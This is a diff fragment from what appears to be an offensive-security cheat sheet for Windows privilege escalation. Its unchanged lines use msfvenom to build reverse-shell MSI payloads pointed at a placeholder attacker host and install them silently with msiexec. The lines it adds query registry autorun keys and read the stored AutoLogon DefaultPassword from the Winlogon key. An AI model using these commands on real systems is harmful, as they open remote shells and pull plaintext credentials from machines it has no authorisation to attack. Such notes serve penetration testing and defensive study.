@@ -3922,6 +3922,13 @@ msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f msi -
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f msi -a x64 -o shell.msi
 ## execute .msi
 msiexec /quiet /qn /i C:\path\to\msi
+
+# AutoRuns
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+# AutoLogon
+reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultPassword
 ```
 
 
